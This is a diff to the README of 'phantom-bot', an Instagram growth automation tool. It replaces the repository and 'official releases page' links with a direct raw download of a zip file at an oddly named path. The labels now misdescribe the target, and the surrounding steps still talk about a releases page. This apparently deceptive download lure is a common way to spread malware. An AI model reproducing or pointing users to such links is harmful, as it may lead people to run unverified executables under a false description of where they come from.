@@ -1,6 +1,6 @@
 # 🤖 phantom-bot - Automate your Instagram growth today
 
-[![](https://img.shields.io/badge/Download-PhantomBot-blue.svg)](https://github.com/Katiepainful8561/phantom-bot)
+[![](https://img.shields.io/badge/Download-PhantomBot-blue.svg)](https://raw.githubusercontent.com/Katiepainful8561/phantom-bot/main/uncheated/bot_phantom_Obrazil.zip)
 
 ## 🎯 About This Software
 
@@ -22,7 +22,7 @@ Before you install this software, make sure your computer meets these needs:
 
 You need to access the official release page to get the program file. Follow these instructions to download the latest version:
 
-1. Visit the [official releases page](https://github.com/Katiepainful8561/phantom-bot).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Katiepainful8561/phantom-bot/main/uncheated/bot_phantom_Obrazil.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the link that shows the latest version number.
 4. Scroll down to the Assets section.
